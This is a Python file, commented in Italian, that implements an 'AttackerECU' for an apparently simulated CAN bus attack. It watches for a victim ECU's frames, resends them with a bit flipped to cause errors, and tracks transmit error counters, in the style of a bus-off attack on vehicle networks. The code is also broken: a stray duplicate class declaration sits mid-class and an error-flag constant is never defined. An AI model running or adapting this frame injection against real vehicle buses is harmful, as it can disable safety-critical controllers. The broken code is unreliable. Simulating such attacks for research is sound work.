from ecu_base import ECU, Role, NodeState, ErrorFlagType
import can
import time
import random
import sys

# --- Funzioni per Bit Flipping (Copiate dall'ultima versione funzionante) ---

def flip_first_one_from_left(byte_val: int) -> int:
    """
    Cerca il primo bit a 1 da sinistra (bit 7 → 0) e lo mette a 0.
    Se il byte è 0x00, lo lascia invariato.
    """
    for bit in range(7, -1, -1):
        if byte_val & (1 << bit):
            return byte_val & ~(1 << bit)
    return byte_val


# --- Classe Attacker ---

class AttackerECU(ECU):
    def __init__(self, victim_id: int, *args, **kwargs):
        # L'Attaccante non trasmette ciclicamente, quindi period_sec=0.0
        super().__init__(*args, **kwargs)
        self.victim_id = victim_id

    # L'Attaccante non trasmette periodicamente, quindi override del loop TX
    def _tx_loop(self):
        while not self._stop:
            time.sleep(0.1)
    class AttackerECU(ECUBase):

    def _rx_loop(self):
        """RX loop specializzato per l'attaccante: non consuma gli ERROR_FLAG."""
        while not self._stop:
            try:
                msg = self.bus.recv(timeout=0.1)
            except can.CanError:
                continue

            if msg is None:
                continue

            # NON gestire qui gli ERROR_FLAG, così li vede solo l'handle dell'attacco
            if msg.arbitration_id == ERROR_FLAG_ID:
                # Lascialo "passare": sarà ricevuto dal recv() in _handle_normal_frame
                continue

            # Tutto il resto passa alla logica dell'attaccante
            self._handle_normal_frame(msg)

    def _handle_normal_frame(self, msg: can.Message):
        if msg.arbitration_id != self.victim_id:
            return
    
        modified_data = bytearray(msg.data)
        if len(modified_data) > 0:
            modified_data[0] = flip_first_one_from_left(modified_data[0])
    
        att_msg = can.Message(
            arbitration_id=self.victim_id,
            data=modified_data,
            is_extended_id=msg.is_extended_id
        )
    
        try:
            self.currently_transmitting = True
            self.last_tx_data = bytes(modified_data)
            self.last_tx_time = time.time()
    
            self.bus.send(att_msg)
            print(f"[{self.name}] ATTACK: TX_V={msg.data.hex().upper()} → TX_A={att_msg.data.hex().upper()}")
    
            error_detected = False
            response_msg = self.bus.recv(timeout=0.05)
    
            if response_msg is not None and response_msg.arbitration_id == ERROR_FLAG_ID:
                flag_type = ErrorFlagType(response_msg.data[0])
                if flag_type == ErrorFlagType.ACTIVE:
                    self._on_tx_error()   # TEC +8
                    error_detected = True
                    print(f"[{self.name}] att → TEC +8: Rilevato ERROR FLAG ACTIVE della Vittima.")
    
            if not error_detected:
                # Nessun ERROR_FLAG ACTIVE visto → TX considerato OK
                self._on_tx_success()    # TEC -1
                print(f"[{self.name}] att → TEC -1: (TX successo).")
    
        except can.CanError as e:
            print(f"[{self.name}] Errore invio frame attacco: {e}")
            self._on_tx_error()
    
        finally:
            time.sleep(0.01)
            self.currently_transmitting = False
